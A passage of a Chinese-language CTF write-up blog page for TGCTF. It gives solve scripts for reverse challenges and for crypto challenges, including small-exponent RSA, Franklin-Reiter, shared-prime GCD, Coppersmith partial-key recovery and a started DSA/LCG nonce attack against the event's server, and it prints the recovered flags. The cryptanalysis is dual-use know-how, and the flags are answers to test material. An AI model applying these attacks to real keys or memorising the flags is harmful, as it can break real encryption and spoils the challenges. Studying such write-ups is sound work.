class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">      pw[i][j]=pw[i][j]^<span class="built_in">ord</span>(key[j])</span><br><span class="line">    <span class="comment"># print(pw[i],end=&#x27;,&#x27;)</span></span><br><span class="line"></span><br><span class="line">B = np.array(xor)</span><br><span class="line">C = np.array(pw) </span><br><span class="line"><span class="comment"># print(C)</span></span><br><span class="line">B_inv = np.linalg.inv(B)</span><br><span class="line"><span class="comment"># print(B_inv)</span></span><br><span class="line">A = np.dot(B_inv,C)</span><br><span class="line"></span><br><span class="line">A_i=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">     A_i.append(<span class="built_in">int</span>(A[i][j]))</span><br><span class="line"><span class="comment"># print(A_i)</span></span><br><span class="line"></span><br><span class="line">table=[<span class="number">0x0000001B</span>, <span class="number">0x0000001A</span>, <span class="number">0x00000019</span>, <span class="number">0x00000017</span>, <span class="number">0x0000001C</span>, <span class="number">0x00000001</span>, <span class="number">0x00000006</span>, <span class="number">0x0000000A</span>, </span><br><span class="line">    <span class="number">0x00000014</span>, <span class="number">0x00000007</span>, <span class="number">0x0000000F</span>, <span class="number">0x0000000E</span>, <span class="number">0x0000001F</span>, <span class="number">0x00000012</span>, <span class="number">0x00000013</span>, <span class="number">0x00000015</span>, </span><br><span class="line">    <span class="number">0x00000009</span>, <span class="number">0x0000001E</span>, <span class="number">0x00000016</span>, <span class="number">0x00000018</span>, <span class="number">0x00000008</span>, <span class="number">0x00000002</span>, <span class="number">0x0000001D</span>, <span class="number">0x00000003</span>, </span><br><span class="line">    <span class="number">0x0000000C</span>, <span class="number">0x0000000B</span>, <span class="number">0x00000011</span>, <span class="number">0x00000010</span>, <span class="number">0x00000000</span>, <span class="number">0x0000000D</span>, <span class="number">0x00000005</span>, <span class="number">0x00000004</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">   A_i[i],A_i[<span class="number">63</span>-table[i]]=A_i[<span class="number">63</span>-table[i]],A_i[i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">   <span class="built_in">print</span>(<span class="built_in">chr</span>(A_i[i]),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#3zfb899ac5c256d-7a8r59f0tccd-4fa6b8vfd111-a44ffy4r0-6dce5679da58</span></span><br></pre></td></tr></table></figure>
<h3 id="exchange"><strong>exchange</strong></h3>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image.png"
                        alt="image"
                 ></p>
<p>魔改des，神秘表，0改1，1改0，推出逆表，再把密文patch回去出原文</p>
<p>333936147332632923d96353321d3345636826d26314621d3349330463126348</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">w_flag=<span class="string">&#x27;333936147332632923d96353321d3345636826d26314621d3349330463126348&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(w_flag),<span class="number">4</span>):</span><br><span class="line">    flag+=w_flag[i+<span class="number">0</span>]</span><br><span class="line">    flag+=w_flag[i+<span class="number">2</span>]</span><br><span class="line">    flag+=w_flag[i+<span class="number">1</span>]</span><br><span class="line">    flag+=w_flag[i+<span class="number">3</span>]</span><br><span class="line"><span class="built_in">print</span>(binascii.unhexlify(flag))</span><br><span class="line"><span class="comment">#391ds2b9-9e31-45f8-ba4a-4904a2d8</span></span><br></pre></td></tr></table></figure>
<h2 id="Crypto：">Crypto：</h2>
<h3 id="宝宝RSA">宝宝RSA</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p1 = <span class="number">8362851990079664018649774360159786938757293294328116561219351503022492961843907118845919317399785168488103775809531198339213009936918460080250107807031483</span></span><br><span class="line">q1 = <span class="number">8312546034426788223492083178829355192676175323324230533451989649056072814335528263136523605276378801682321623998646291206494179416941978672637426346496531</span></span><br><span class="line">c1 = <span class="number">39711973075443303473292859404026809299317446021917391206568511014894789946819103680496756934914058521250438186214943037578346772475409633145435232816799913236259074769958139045997486622505579239448395807857034154142067866860431132262060279168752474990452298895511880964765819538256786616223902867436130100322</span></span><br><span class="line">n2 = <span class="number">103873139604388138367962901582343595570773101048733694603978570485894317088745160532049473181477976966240986994452119002966492405873949673076731730953232584747066494028393377311943117296014622567610739232596396108513639030323602579269952539931712136467116373246367352649143304819856986264023237676167338361059</span></span><br><span class="line">c2 = <span class="number">51380982170049779703682835988073709896409264083198805522051459033730166821511419536113492522308604225188048202917930917221</span></span><br><span class="line">e2 = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">phi1 = (p1-<span class="number">1</span>)*(q1-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> e <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">18</span>):</span><br><span class="line">    <span class="keyword">if</span> GCD(phi1,e) == <span class="number">1</span>:</span><br><span class="line">        d1 = invert(e,phi1)</span><br><span class="line">        m1 = <span class="built_in">pow</span>(c1,d1,p1*q1)</span><br><span class="line">        flag = long_to_bytes(m1)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;TGCTF&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    res = gmpy2.iroot(c2 + k * n2, e2)</span><br><span class="line">    <span class="keyword">if</span> res[<span class="number">1</span>]:</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(res[<span class="number">0</span>])))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    k += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b&#x27;TGCTF&#123;!!3xP_Is_Sm@ll_But_D@ng3r0&#125;&#x27;</span></span><br><span class="line"><span class="string">261713</span></span><br><span class="line"><span class="string">m@ll_But_D@ng3r0&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<h3 id="费克特尔"><strong>费克特尔</strong></h3>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/29f00ffc-f588-4162-8d03-2d9641abd63f.png"
                        alt="" title=" =1531x969"
                 ></p>
<p>TGCTF{f4888_6abdc_9c2bd_9036bb}</p>
<h3 id="tRwSiAns"><strong>tRwSiAns</strong></h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">n = <span class="number">100885785256342169056765112203447042910886647238787490462506364977429519290706204521984596783537199842140535823208433284571495132415960381175163434675775328905396713032321690195499705998621049971024487732085874710868565606249892231863632731481840542506411757024315315311788336796336407286355303887021285839839</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">c1 = <span class="number">41973910895747673899187679417443865074160589754180118442365040608786257167532976519645413349472355652086604920132172274308809002827286937134629295632868623764934042989648498006706284984313078230848738989331579140105876643369041029438708179499450424414752031366276378743595588425043730563346092854896545408366</span></span><br><span class="line">c2 = <span class="number">41973912583926901518444642835111314526720967879172223986535984124576403651553273447618087600591347032422378272332279802860926604693828116337548053006928860031338938935746179912330961194768693506712533420818446672613053888256943921222915644107389736912059397747390472331492265060448066180414639931364582445814</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hash</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(hashlib.md5(<span class="built_in">str</span>(x).encode()).hexdigest(), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">franklinReiter</span>(<span class="params">n,e,c1,c2</span>):</span><br><span class="line">    PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    f1 = (x + <span class="built_in">hash</span>(<span class="number">307</span>))^e - c1</span><br><span class="line">    f2 = (x + <span class="built_in">hash</span>(<span class="number">7</span>))^e - c2</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gcd</span>(<span class="params">f1,f2</span>):</span><br><span class="line">        <span class="keyword">while</span> f2:</span><br><span class="line">            f1 , f2 = f2 , f1 % f2</span><br><span class="line">        <span class="keyword">return</span> f1.monic()</span><br><span class="line">    <span class="keyword">return</span> -gcd(f1,f2)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">m=franklinReiter(n,e,c1,c2)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)))</span><br><span class="line"><span class="comment"># TGCTF&#123;RS4_Tw1nZ_d0You_th1nk_ItS_fun_2win?!!!1111111111&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="mm不躲猫猫"><strong>mm不躲猫猫</strong></h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">n_list = []</span><br><span class="line">c_list = []</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;challenge.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    lines = f.readlines()</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="built_in">len</span>(lines):</span><br><span class="line">    line = lines[i].strip()</span><br><span class="line">    <span class="keyword">if</span> line.startswith(<span class="string">&#x27;n = &#x27;</span>):</span><br><span class="line">        n_value = <span class="built_in">int</span>(line.split(<span class="string">&#x27; = &#x27;</span>)[<span class="number">1</span>])</span><br><span class="line">        c_line = lines[i + <span class="number">1</span>].strip()</span><br><span class="line">        <span class="keyword">if</span> c_line.startswith(<span class="string">&#x27;c = &#x27;</span>):</span><br><span class="line">            c_value = <span class="built_in">int</span>(c_line.split(<span class="string">&#x27; = &#x27;</span>)[<span class="number">1</span>])</span><br><span class="line">            n_list.append(n_value)</span><br><span class="line">            c_list.append(c_value)</span><br><span class="line">            i += <span class="number">2</span>  <span class="comment"># 跳过已处理的两行</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Expected &#x27;c = &#x27; after &#x27;n = &#x27;, but got: <span class="subst">&#123;c_line&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(n_list)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(n_list)):</span><br><span class="line">        p = GCD(n_list[i],n_list[j])</span><br><span class="line">    <span class="keyword">if</span> p != <span class="number">1</span> <span class="keyword">and</span> i != j <span class="keyword">and</span> isPrime(p):</span><br><span class="line">        <span class="built_in">print</span>(p)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;i = <span class="subst">&#123;i&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;j = <span class="subst">&#123;j&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = <span class="number">8966982846196321583218732818156212338929358106653027903288099594075033180211918114777730737751247653195936571427074856051307498770294940971178276714212171</span></span><br><span class="line">i = <span class="number">58</span></span><br><span class="line">j = <span class="number">59</span></span><br><span class="line"></span><br><span class="line">c = c_list[<span class="number">59</span>]</span><br><span class="line">d = gmpy2.invert(e,p-<span class="number">1</span>)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,p)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment"># TGCTF&#123;ExcePt10n4lY0u_Fl4gF0rY0u_555b0nus&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="AAAAAAAA·真·签到"><strong>AAAAAAAA·真·签到</strong></h3>
<p>偏移量是1 0 -1 -2 -3……</p>
<p>根据偏移量移动flag，得到flag：TGCTF{WO0O!Y04_5R3_GOOD_AT_MOVE}</p>
<h3 id="🇪🇿🇷🇸🇦"><strong>🇪🇿🇷🇸🇦</strong></h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_root</span>(<span class="params">p,e,c</span>):</span><br><span class="line">    g=GCD(e, p-<span class="number">1</span>)</span><br><span class="line">    e=e//g</span><br><span class="line">    mg=<span class="built_in">pow</span>(c, inverse(e, p-<span class="number">1</span>),p)</span><br><span class="line">    R.&lt;x&gt;=Zmod(p)[]</span><br><span class="line">    f=x^g-mg</span><br><span class="line">    <span class="keyword">return</span> f.roots()</span><br><span class="line"></span><br><span class="line">p0 = <span class="string">&#x27;😘😾😂😋😶😾😳😷&#x27;</span></span><br><span class="line">n = <span class="number">156583691355552921614631145152732482393176197132995684056861057354110068341462353935267384379058316405283253737394317838367413343764593681931500132616527754658531492837010737718142600521325345568856010357221012237243808583944390972551218281979735678709596942275013178851539514928075449007568871314257800372579</span></span><br><span class="line">c = <span class="number">47047259652272336203165844654641527951135794808396961300275905227499051240355966018762052339199047708940870407974724853429554168419302817757183570945811400049095628907115694231183403596602759249583523605700220530849961163557032168735648835975899744556626132330921576826526953069435718888223260480397802737401</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(bytes_to_long(<span class="string">&#x27;😘&#x27;</span>.encode()))</span><br><span class="line">e = <span class="string">&quot;💯&quot;</span></span><br><span class="line">e=bytes_to_long(e.encode())</span><br><span class="line"><span class="keyword">for</span> pp <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4036991100</span>,<span class="number">4036991100</span>+<span class="number">50</span>):</span><br><span class="line">    R.&lt;x&gt;=Zmod(n)[]</span><br><span class="line">    f=x*<span class="number">2</span>**<span class="number">288</span>+bytes_to_long(long_to_bytes(pp)+p0.encode())</span><br><span class="line">    f=f.monic()</span><br><span class="line">    roots=f.small_roots(X=<span class="number">2</span>^<span class="number">224</span>,beta=<span class="number">0.4</span>)</span><br><span class="line">    <span class="keyword">if</span> roots:</span><br><span class="line">        f=x*<span class="number">2</span>**<span class="number">288</span>+bytes_to_long(long_to_bytes(pp)+p0.encode())</span><br><span class="line">        p=<span class="built_in">int</span>(f(roots[<span class="number">0</span>]))</span><br><span class="line">        q=n//p</span><br><span class="line">        res1=find_root(p, e, c)</span><br><span class="line">        res2=find_root(q, e, c)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> res1:</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> res2:</span><br><span class="line">                m=crt([<span class="built_in">int</span>(i[<span class="number">0</span>]),<span class="built_in">int</span>(j[<span class="number">0</span>])],[p,q])</span><br><span class="line">                m=long_to_bytes(<span class="built_in">int</span>(m))</span><br><span class="line">                <span class="keyword">if</span> <span class="string">b&#x27;TGCTF&#x27;</span> <span class="keyword">in</span> m:</span><br><span class="line">                    <span class="built_in">print</span>(m.decode())</span><br><span class="line"><span class="comment"># TGCTF&#123;🙇🏮🤟_🫡🫡🫡_🚩🚩🚩&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="LLLCG">LLLCG</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy.ntheory.modular <span class="keyword">import</span> crt</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TripleLCG</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, seed1, seed2, seed3, a, b, c, d, n</span>):</span><br><span class="line">        <span class="variable language_">self</span>.state = [seed1, seed2, seed3]</span><br><span class="line">        <span class="variable language_">self</span>.a = a</span><br><span class="line">        <span class="variable language_">self</span>.b = b</span><br><span class="line">        <span class="variable language_">self</span>.c = c</span><br><span class="line">        <span class="variable language_">self</span>.d = d</span><br><span class="line">        <span class="variable language_">self</span>.n = n</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>):</span><br><span class="line">        new = (<span class="variable language_">self</span>.a * <span class="variable language_">self</span>.state[-<span class="number">3</span>] + <span class="variable language_">self</span>.b * <span class="variable language_">self</span>.state[-<span class="number">2</span>] + <span class="variable language_">self</span>.c * <span class="variable language_">self</span>.state[-<span class="number">1</span>] + <span class="variable language_">self</span>.d) % <span class="variable language_">self</span>.n</span><br><span class="line">        <span class="variable language_">self</span>.state.append(new)</span><br><span class="line">        <span class="keyword">return</span> new</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DSA</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># while True:</span></span><br><span class="line">            <span class="comment"># self.q = getPrime(160)</span></span><br><span class="line">            <span class="comment"># t = 2 * getPrime(1024 - 160) * self.q</span></span><br><span class="line">            <span class="comment"># if isPrime(t + 1):</span></span><br><span class="line">            <span class="comment">#    self.p = t + 1</span></span><br><span class="line">            <span class="comment">#    break</span></span><br><span class="line">        <span class="variable language_">self</span>.p = dsa_p</span><br><span class="line">        <span class="variable language_">self</span>.q = dsa_q</span><br><span class="line">        <span class="variable language_">self</span>.g = <span class="built_in">pow</span>(<span class="number">2</span>, (<span class="variable language_">self</span>.p - <span class="number">1</span>) // <span class="variable language_">self</span>.q, <span class="variable language_">self</span>.p)</span><br><span class="line">        <span class="variable language_">self</span>.x = randint(<span class="number">1</span>, <span class="variable language_">self</span>.q - <span class="number">1</span>)</span><br><span class="line">        <span class="variable language_">self</span>.y = <span class="built_in">pow</span>(<span class="variable language_">self</span>.g, <span class="variable language_">self</span>.x, <span class="variable language_">self</span>.p)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">self, msg, k</span>):</span><br><span class="line">        h = bytes_to_long(sha256(msg).digest())</span><br><span class="line">        r = <span class="built_in">pow</span>(<span class="variable language_">self</span>.g, k, <span class="variable language_">self</span>.p) % <span class="variable language_">self</span>.q</span><br><span class="line">        s = (inverse(k, <span class="variable language_">self</span>.q) * (h + <span class="variable language_">self</span>.x * r)) % <span class="variable language_">self</span>.q</span><br><span class="line">        <span class="keyword">return</span> (r, s)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">verify</span>(<span class="params">self, msg, r, s</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> (<span class="number">0</span> &lt; r &lt; <span class="variable language_">self</span>.q <span class="keyword">and</span> <span class="number">0</span> &lt; s &lt; <span class="variable language_">self</span>.q):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        h = bytes_to_long(sha256(msg).digest())</span><br><span class="line">        w = inverse(s, <span class="variable language_">self</span>.q)</span><br><span class="line">        u1 = (h * w) % <span class="variable language_">self</span>.q</span><br><span class="line">        u2 = (r * w) % <span class="variable language_">self</span>.q</span><br><span class="line">        v = ((<span class="built_in">pow</span>(<span class="variable language_">self</span>.g, u1, <span class="variable language_">self</span>.p) * <span class="built_in">pow</span>(<span class="variable language_">self</span>.y, u2, <span class="variable language_">self</span>.p)) % <span class="variable language_">self</span>.p) % <span class="variable language_">self</span>.q</span><br><span class="line">        <span class="keyword">return</span> v == r</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node1.tgctf.woooo.tech&#x27;</span>,<span class="number">32052</span>)</span><br><span class="line"></span><br><span class="line">primes = [<span class="number">59093</span>, <span class="number">65371</span>, <span class="number">37337</span>, <span class="number">43759</span>, <span class="number">52859</span>, <span class="number">39541</span>, <span class="number">60457</span>, <span class="number">61469</span>, <span class="number">43711</span>]</span><br><span class="line">io.recvline()</span><br><span class="line">io.recvline()</span><br><span class="line">data = io.recvline().strip().split(<span class="string">b&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = <span class="built_in">int</span>(data[<span class="number">2</span>][:-<span class="number">1</span>])</span><br><span class="line">q = <span class="built_in">int</span>(data[<span class="number">5</span>][:-<span class="number">1</span>])</span><br><span class="line">g = <span class="built_in">int</span>(data[<span class="number">8</span>][:-<span class="number">1</span>])</span><br><span class="line">y = <span class="built_in">int</span>(data[<span class="number">11</span>][:-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;p = <span class="subst">&#123;p&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;q = <span class="subst">&#123;q&#125;</span>&#x27;</span>)</span><br><span class="line"><span 